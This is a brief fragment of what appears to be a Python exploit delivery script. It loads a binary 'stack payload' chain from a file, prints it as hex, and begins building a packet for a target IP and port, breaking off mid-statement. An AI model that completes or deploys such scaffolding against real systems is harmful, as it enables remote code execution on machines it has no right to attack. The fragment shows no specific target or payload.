...
def get_chain(stack_bin):
    with open(stack_bin, "rb") as f:
        chain = f.read()
    
    print("Chain: " + " ".join("%02x"%ord(x) for x in chain))
    return chain

if __name__ == '__main__':
    assert len(sys.argv) == 4, "{} <ip> <port> <stack-payload>".format(sys.argv[0])

    chain = get_chain(sys.argv[3])
    pkg = b"".join([
